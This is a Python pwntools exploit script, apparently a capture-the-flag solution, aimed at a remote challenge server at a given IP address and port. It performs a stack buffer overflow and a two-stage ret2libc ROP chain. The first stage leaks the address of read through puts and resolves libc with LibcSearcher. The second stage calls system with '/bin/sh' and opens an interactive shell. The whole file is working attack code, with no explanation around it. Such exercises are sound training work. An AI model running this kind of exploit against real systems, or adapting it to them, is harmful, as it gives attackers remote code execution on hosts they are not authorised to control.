from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
context.arch = 'amd64'

# p = process('../file/bee9f73f50d2487e911da791273ae5a3') # 本地使用libc库不在LibcSearcher使用的数据库中，无法成功
p = remote('61.147.171.105', '58767')

pop_rdi_ret = 0x0000000000400763
read_got = 0x0000000000601028
put_plt = 0x0000000000400500
main_addr = 0x00400550

payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    read_got,
    put_plt,
    main_addr,
)
payload = payload.ljust(200, b'a')
p.send(payload)

p.recvuntil(b'bye~\n')
read_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
print(read_addr)

obj = LibcSearcher('read', read_addr)
libc_base = read_addr - obj.dump('read')
print(hex(libc_base))

system_addr = libc_base + obj.dump('system')
bin_sh_addr = libc_base + obj.dump('str_bin_sh')

payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    bin_sh_addr,
    system_addr,
).ljust(200, b'a')

p.send(payload)

p.interactive()